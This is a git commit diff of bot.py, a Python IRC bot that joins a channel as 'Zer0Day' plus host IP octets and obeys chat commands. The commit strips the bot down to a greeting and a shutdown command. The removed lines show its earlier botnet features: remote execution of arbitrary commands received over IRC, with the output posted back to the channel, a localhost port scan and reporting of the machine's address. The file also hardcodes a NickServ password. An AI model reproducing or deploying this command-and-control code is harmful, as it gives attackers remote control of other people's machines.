f6ababac7e428af1b8e65fd5938ef8684e084a82
Jared Stroud <jaredestroud@gmail.com>
2015-08-30 07:13:48 -0400

    Completed nice minimalistic bot

--- bot.py
+++ bot.py
@@ -1,12 +1,10 @@
 #/usr/bin/env python
-#Dependencies
 import socket
 import urllib2
 import subprocess
 import commands
 import urllib
 import sys
-import ctypes
 import random
 import time
 import platform
@@ -22,81 +20,40 @@ def bot_nick():
 	two_oct = (str(oct_1[2]) + "_"+ str(oct_2[3]))
 	return two_oct 
 	
-#settings
+# IRC Settings
 x = bot_nick()
 server = "" #Server goes here      
-channel = "#lolcakes"
-botnick = ("Zer0Day" + x)
+channel = "#" # Channel to connect to goes here (all channels require a # infront of their name)
+botnick = ("Zer0Day" + x) # The bot's name will be Zer0Day followed by the IP Address of the machine it's calling from.
 
-def readCommand(args):
-	command = args[3][1:]
-	
 def sayHello(text):
-	if text.find(':Hi') !=-1: #you can change !hi to whatever you want
-		t = text.split(':Hi') #you can change t and to :)
-		to = t[1].strip() #this code is for getting the first word after !hi
-		irc.send('PRIVMSG '+channel+' :Hello Commander, lovely day is it not?' + '\r\n')
+        '''
+            Name: sayHello
+            Purpose: Awaits the text "Hi" and responds with "Hello Commands, lovely day is it not?".
+                     This servers as an "are you alive?" message.
+            Return: Text in IRC chat.
+       
+        '''
+        if text.find(':Hi') !=-1: #you can change !hi to whatever you want
+            t = text.split(':Hi') #you can change t and to :)
+            to = t[1].strip() #this code is for getting the first word after !hi
+            irc.send('PRIVMSG '+channel+' :Hello Commander, lovely day is it not?' + '\r\n')
 	
-def getInfo(text):
-	'''Local eth0 address'''
-	intf = "eth0"
-	intf_ip = commands.getoutput("ip address show dev " + intf).split()
-	intf_ip = intf_ip[intf_ip.index('inet') + 1].split('/')[0]
-
-	if text.find(':address') !=-1: #you can change !hi to whatever you want
-		t = text.split(':address') #you can change t and to :)
-		to = t[1].strip() #this code is for getting the first word after !hi
-		irc.send('PRIVMSG '+channel+' :I am here: ' + intf_ip+ '\r\n')
-#		return(my_ip)
-		
-def localScanner(text):
-	if text.find(":What are you doing tonight?") !=-1: #you can change !hi to whatever you want
-		t = text.split(":What are you doing tonight?") 
-		to = t[1].strip() #this code is for getting the first word after !hi
-	
-		portList = [80, 443, 3306, 23,  22, 21 ,20]
-		x = 0
-		for port in (portList): 
-			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			result = sock.connect_ex(('127.0.0.1', port))
-			x += 1
-			if result == 0 and x == 1:
-				irc.send('PRIVMSG '+channel+' :HTTP' + '\r\n')
-			if result == 0 and x == 2:
-				irc.send('PRIVMSG '+channel+' :HTTPS' +  '\r\n')
-			if result == 0 and x == 3:
-				irc.send('PRIVMSG '+channel+' :MySQL' + '\r\n')
-			if result == 0 and x == 4:
-				irc.send('PRIVMSG '+channel+' :Telnet.' + '\r\n')
-			if result == 0 and x == 5:
-				irc.send('PRIVMSG '+channel+' : SSH.' + '\r\n')
-			if result == 0 and x == 6:
-				irc.send('PRIVMSG '+channel+' : FTP' + '\r\n')
-			if result == 0 and x == 7:
-				irc.send('PRIVMSG '+channel+' : FTP' + '\r\n')
-				
-			sock.close()
-
-			
-def command_execution(text):
-	if text.find(":command") !=-1: 
-		t = text.split(":command") #you can change t and to :)
-		to = t[1].strip() #this code is for getting the first word after !hi
-		try:
-			cmd_result = subprocess.check_output([str(to)])
-			irc.send('PRIVMSG '+channel+' : ' + str(cmd_result) + '\r\n')
-		except:
-			irc.send('PRIVMSG '+channel+' : ' + "[Error] could not run: " + to + '\r\n')
-			pass	
-
 def goodnight(text):
-	if text.find(":goodnight and good luck") !=-1: #you can change !hi to whatever you want
-		t = text.split(":goodnight and good luck") #you can change t and to :)
-		to = t[1].strip() #this code is for getting the first word after !hi
-		sys.exit()
+        '''
+            Name: goodnight
+            Purpose: Awaits the text "goodnight and goodluck" to shutdown the Bot.
+        '''
+        if text.find(":goodnight and good luck") !=-1: #you can change !hi to whatever you want
+            t = text.split(":goodnight and good luck") #you can change t and to :)
+            to = t[1].strip() #this code is for getting the first word after !hi
+            sys.exit()
 		
 if __name__ == "__main__":
-    #IRC Server connecting stuff
+    '''
+        Main function that connects to IRC server and awaits commands to be issued.
+        This should be moved to a few functions or a class to better configure the bot.
+    '''
     irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Defines the socket
     irc.connect((server, 6667))                                                         #connects to the server
     irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :This is a fun bot!\n") #user authentication
@@ -104,7 +61,7 @@ if __name__ == "__main__":
     irc.send("PRIVMSG nickserv :iNOOPE\r\n")    # Auth
     irc.send("JOIN "+ channel +"\n")        # Join the channel specified above
                                     
-    while 1:    #puts Bot in a loop
+    while 1:    #puts Bot in a loop constantly waiting to receive text.
             text=irc.recv(4096)  #receive the text
             lines = text.split("\n")
 
@@ -113,16 +70,8 @@ if __name__ == "__main__":
             elif text.find("PRIVMSG " + botnick): # For private messaging individual bots.
                     #Custom commands
                     sayHello(text)
-                    getInfo(text)
-                    localScanner(text)
-                    command_execution(text)
-                    windowCleaner(text)
                     goodnight(text)
             else:
             #Custom commands
                     sayHello(text)
-                    getInfo(text)
-                    localScanner(text)
-                    command_execution(text)
-                    windowCleaner(text)
                     goodnight(text)
